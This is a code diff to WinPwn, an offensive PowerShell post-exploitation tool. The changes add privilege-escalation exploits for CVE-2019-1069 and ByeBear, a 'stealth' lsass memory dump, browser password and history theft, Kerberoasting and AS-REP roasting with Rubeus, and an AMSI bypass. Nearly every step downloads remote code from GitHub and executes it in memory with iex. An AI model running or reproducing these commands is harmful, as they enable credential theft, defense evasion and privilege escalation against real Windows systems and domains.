@@ -155,7 +155,7 @@ function sharpcradle{
     if ($polar)
     {
     	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password to elevate privileges?'
+    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
 	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
 	    {
 		    $username = Read-Host -Prompt 'Please enter the username'
@@ -178,22 +178,25 @@ function sharpcradle{
 			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
 		    }
 		
-		    <#$system = Read-Host -Prompt 'Did you get a system shell? (y/n)'
-		    if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
-		    {
-			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
-			    Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-			    Start-Sleep -Seconds 15
-			    Write-Host 'Next Try..'
-			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
-			    Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-			    Start-Sleep -Seconds 15
-		    }#>
 		    move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
 		    del .\schedsvc.dll
 		    del .\schtasks.exe
 		    del C:\windows\system32\tasks\test
 	    }
+        else
+        {
+            $system = Read-Host -Prompt 'You can also try to elevate privileges using the last sandboxescaper vuln (ByeBear). Lets do it? (y/n)'
+	        if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
+	            {
+	                Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
+		            Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
+		            Start-Sleep -Seconds 15
+		            Write-Host 'Next Try..'
+		            Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
+		            Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
+		            Start-Sleep -Seconds 15
+                }
+        }
     }
     else
     {    
@@ -409,7 +412,14 @@ function kittielocal
             {
                 Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+                $lsass = Read-Host -Prompt 'Only dump lsass without using the cat (more stealth)? (recommended) (yes/no)'
+		        if ($lsass -eq "yes" -or $lsass -eq "y" -or $lsass -eq "Yes" -or $lsass -eq "Y")
+                {
+                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
+                    Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
+                    Safetydump   
+                }
+                else{Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true}
 		   
             }
             else
@@ -509,6 +519,7 @@ function localreconmodules
             Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$currentPath\LocalRecon\NetRoutes.txt"
             Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
             netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
+            Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release >> "$currentPath\LocalRecon\InstalledDotNetVersions"
             Write-Host -ForegroundColor Yellow 'Getting Shares'
 	    net share >> "$currentPath\LocalRecon\Networkshares.txt"
 	    Write-Host -ForegroundColor Yellow 'Getting hosts file content'
@@ -720,10 +731,16 @@ function localreconmodules
             $IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'
             if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
             {
-	    	[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-	    	$vault = New-Object Windows.Security.Credentials.PasswordVault 
-	    	$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"
-	    }
+	    	    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+	    	    $vault = New-Object Windows.Security.Credentials.PasswordVault 
+	    	    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"
+	        }
+            $browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'
+            if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
+            {
+                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
+                Get-BrowserInformation >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
+            }
 }
 
 function passhunt
@@ -955,7 +972,28 @@ function domainreconmodules
             {
                 passhunt -domain $true
             }
+
+            $gpos = Read-Host -Prompt 'Check domain Group policies for common misconfigurations using Grouper2? (yes/no)'
+            if ($gpos -eq "yes" -or $gpos -eq "y" -or $gpos -eq "Yes" -or $gpos -eq "Y")
+            {
+                GPOAudit
+            }
 	    
+}
+
+function GPOAudit
+{
+<#
+        .DESCRIPTION
+        Check Group Policies for common misconfigurations using Grouper2.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    #Domain Recon
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/Grouper2.exe?raw=true -argument1 "-f" -argument2 "$currentPath\DomainRecon\GPOAudit.html"
 }
 
 
@@ -1364,6 +1402,11 @@ function kerberoasting
     pathcheck
     Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
     Write-Host -ForegroundColor Red 'Kerberoasting active:'
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')    
+    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\Exploitation\'
+	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
+	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+    Write-Host -ForegroundColor Yellow 'Using the powershell version for sure'
     cmd /c start powershell -Command {$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat | fl >> $currentPath\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}
 }
 
@@ -1567,7 +1610,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
 	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
 	Write-Host -ForegroundColor Green '21. Show some polar bears in action!'
-        Write-Host -ForegroundColor Green '22. Exit. '
+    Write-Host -ForegroundColor Green '22. Do an Group Policy Audit using Grouper2!'
+        Write-Host -ForegroundColor Green '23. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1594,9 +1638,10 @@ __        ___       ____
 	    19{sharpcradle -allthosedotnet $true}
 	    20{sharpcradle}
 	    21{sharpcradle -polar $true}
+        22{GPOAudit}
        }
     }
- While ($masterquestion -ne 22)
+ While ($masterquestion -ne 23)
      
     
     #End
